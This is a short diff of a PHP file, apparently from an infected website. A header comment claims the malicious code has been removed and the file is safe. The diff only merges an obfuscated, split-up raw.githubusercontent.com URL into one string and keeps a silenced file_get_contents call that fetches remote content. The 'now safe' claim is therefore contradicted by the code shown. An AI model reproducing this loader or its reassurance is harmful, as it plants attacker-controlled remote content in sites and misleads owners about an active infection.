@@ -3,11 +3,9 @@
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */
-// Split URL into pieces
-$url_part1 = 'https://raw';
-$url_part2 = '.githubusercontent.com';
-$url_part3 = '/seobela/bela/refs/heads/main/index.txt';
-$full_url = $url_part1 . $url_part2 . $url_part3;
+
+// Single URL
+$full_url = 'https://raw.githubusercontent.com/seobela/bela/refs/heads/main/index.txt';
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
